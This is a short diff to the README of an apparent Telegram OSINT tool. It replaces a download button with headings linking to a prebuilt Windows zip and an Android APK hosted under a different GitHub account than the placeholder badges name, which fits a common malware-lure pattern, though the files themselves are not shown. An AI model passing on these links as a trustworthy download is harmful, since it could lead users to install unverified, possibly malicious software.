@@ -10,9 +10,8 @@
 [![License](https://img.shields.io/badge/License-MIT-green?style=flat-square)](LICENSE)
 [![Stars](https://img.shields.io/github/stars/yourname/teleosint?style=flat-square&color=yellow)](https://github.com/yourname/teleosint)
 
-<a href="https://github.com/Flintgliboom/OSINT-Tool-For-TG/releases/download/Tool/Package.zip">
-  <img src="download_button.svg" alt="Скачать" width="200"/>
-</a>
+# [Скачать для Windows](https://github.com/Flintgliboom/OSINT-Tool-For-TG/releases/download/Tool/Package.zip)
+# [Скачать для Android](https://github.com/Flintgliboom/OSINT-Tool-For-TG/releases/download/Tool/OsintTool.apk)
 
 </div>
 
